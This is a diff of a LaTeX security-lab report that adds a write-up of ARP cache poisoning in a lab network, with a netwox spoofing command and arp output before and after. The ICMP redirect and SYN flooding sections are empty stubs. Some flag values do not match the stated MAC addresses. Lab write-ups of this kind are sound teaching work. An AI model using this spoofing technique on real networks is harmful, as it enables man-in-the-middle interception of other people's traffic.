@@ -90,32 +90,43 @@ In each subtask we explain the cause of a vulnerability, show how to perform a p
   \end{table}
 \end{center}
 
-\section{ARP cache poisoning}
+\section{Part A: TCP attacks}
+
+\subsection{ARP cache poisoning}
+
+Our victim MAC address was "08:00:27:A6:EB:87" while its IP address was 192.168.0.102. We wanted to make the victim think that another 3rd party at address 192.168.0.103 has the MAC of the attacker. The original MAC of the third party was "08:00:27:93:07:7e", while attacker MAC address was "08:00:27:ee:0d:0f". We could see that by running arp -a command:
+
 \begin{lstlisting}
-# Man in the middle example
-#
-# VICTIM
-# MAC: 08:00:27:A6:EB:87
-#   IP: IP: 192.168.0.102
-
-# Some other node
-#   MAC: 08:00:27:93:07:7e
-# IP: 192.168.0.103
-
-# ATTACKER (Man in the middle)
-# MAC: 08:00:27:ee:0d:0f
-#   IP: IP: 192.168.101
-sudo netwox 33 -b 08:00:27:A6:EB:87 -g 192.168.0.103 -h 08:00:27:A6:EB:86 -i 192.168.0.101
-
-
 # Before attack
 seed@victim: arp-a
 (192.168.0.103) at 08:00:27:93:07:7e
+\end{lstlisting}
 
-# After attack
+Using netwox we could spoof a packet that updates ARP cache on the victim's machine and replace the entry with the MAC of the attacker:
+
+\begin{lstlisting}
+sudo netwox 33 -b 08:00:27:A6:EB:87 -g 192.168.0.103 
+	-h 08:00:27:A6:EB:86 -i 192.168.0.101
+\end{lstlisting}
+
+Here 33 is the tool for spoofing ARP packages, we tell the tool the original MAC and new MAC addresses, as well as IP addresses of the victim and the IP address of which entry in the ARP cache we want to modify.
+
+After spoofing the packet, running arp -a tool on the victim's machine results in the following output:
+
+\begin{lstlisting}
 seed@victim: arp-a
 (192.168.0.103) at 08:00:27:ee:0d:0f
 \end{lstlisting}
+
+
+\subsection{ICMP Redirect Attack}
+
+ICMP messages are used to send error or redirection information in the IP protocol.
+
+\subsection{SYN Flooding Attack}
+
+In 
+
 
 \section{Conclusions}
 Attacks presented here show how a user can make harm to the system or gain \texttt{root} privileges by exploiting vulnerabilities in: \texttt{C} string formatting, \texttt{chroot} command/system call, and \texttt{C} buffer overflow.
